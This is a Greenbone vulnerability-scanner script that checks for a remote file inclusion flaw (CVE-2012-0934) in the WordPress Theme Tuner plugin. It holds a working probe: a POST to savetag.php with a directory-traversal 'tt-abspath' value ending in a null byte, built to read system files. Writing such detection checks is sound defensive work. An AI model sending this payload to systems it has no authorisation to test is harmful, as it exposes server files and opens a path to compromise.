# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802604");
  script_version("2025-04-15T05:54:49+0000");
  script_cve_id("CVE-2012-0934");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2012-02-03 12:12:12 +0530 (Fri, 03 Feb 2012)");
  script_name("WordPress Theme Tuner Plugin 'tt-abspath' Parameter Remote File Inclusion Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("wordpress/http/detected");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"http://secunia.com/advisories/47722");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51636");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/72626");
  script_xref(name:"URL", value:"http://wordpress.org/extend/plugins/theme-tuner/changelog");
  script_xref(name:"URL", value:"http://plugins.trac.wordpress.org/changeset/492167/theme-tuner#file2");
  script_xref(name:"URL", value:"http://spareclockcycles.org/2011/09/18/exploitring-the-wordpress-extension-repos");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to compromise the
  application and the underlying system. Other attacks are also possible.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"affected", value:"WordPress Theme Tuner Plugin version 0.7 and prior.");

  script_tag(name:"insight", value:"The flaw is due to improper validation of user-supplied input to
  the 'tt-abspath' parameter in '/ajax/savetag.php', which allows attackers to execute arbitrary PHP
  code.");

  script_tag(name:"solution", value:"Update to WordPress Theme Tuner Plugin version 0.8 or later.");

  script_tag(name:"summary", value:"WordPress is prone to a remote file inclusion vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("host_details.inc");
include("os_func.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/wp-content/plugins/theme-tuner/ajax/savetag.php";

useragent = http_get_user_agent();

files = traversal_files();

# nb: http_host_name() should be always after the static string(s) above but always after any
# dynamically ones (e.g. a random string) which should be different for each hostname.
host = http_host_name(port:port);

foreach file(keys(files)) {

  postData = string("tt-abspath=", crap(data:"../", length:6*9), files[file], "%00");

  req = string("POST ", url, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "User-Agent: ", useragent, "\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: ", strlen(postData), "\r\n",
               "\r\n", postData, "\r\n");
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

  if(egrep(pattern:file, string:res)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
